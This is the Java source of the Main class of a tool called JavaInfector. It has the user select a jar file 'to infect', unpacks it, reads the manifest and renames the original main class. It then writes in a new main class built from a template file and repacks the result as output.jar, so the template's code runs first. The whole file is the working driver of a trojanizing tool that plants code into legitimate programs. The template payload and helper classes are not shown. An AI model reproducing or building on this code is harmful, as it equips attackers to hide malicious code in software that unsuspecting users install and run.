package jlxip.JavaInfector;

import java.io.File;

import javax.swing.JFileChooser;

public class Main {
	
	public static final String DESTDIR = "JAVAINFECTOR_TEMP";
	public static final String TEMPLATE = "template.java";
	public static final String OUTPUT = "output.jar";
	
	Main() {
		// CHECK IF TEMPLATE EXISTS
		if(!new File(TEMPLATE).exists()) {
			System.out.println("File " + TEMPLATE + " does not exist.");
			System.out.println("Aborting...");
			System.exit(0);
		}
		
		JFileChooser JFC_toInfect = new JFileChooser();
		JFC_toInfect.setFileSelectionMode(JFileChooser.FILES_ONLY);
		JFC_toInfect.setDialogTitle("Select jar file to infect");
		JFC_toInfect.setMultiSelectionEnabled(false);
		JFC_toInfect.setCurrentDirectory(new File("."));
		JFC_toInfect.showOpenDialog(null);
		
		File FtoInfect = JFC_toInfect.getSelectedFile();
		if(FtoInfect == null) {
			System.exit(0);
		}
		
		if(!new File(DESTDIR).exists()) {
			new File(DESTDIR).mkdir();
		}
		
		Decompress decompress = new Decompress(FtoInfect, DESTDIR);	// DECOMPRESS THE JAR FILE
		String InternalMC = new GetMainClass().run(DESTDIR);	// READ THE MANIFEST
		File NewMC = new RedirectMainClass().run(DESTDIR, new File(TEMPLATE));	// RENAME MAIN CLASS
		new CreateNewMainClass(new File(InternalMC), new File(TEMPLATE), NewMC);	// CREATE NEW MAIN CLASS
		new Compress(new File(DESTDIR));	// CREATE OUTPUT JAR FILE
		
		new File(DESTDIR).delete();
	}
	
	public static void main(String[] args) {
		new Main();
	}
}
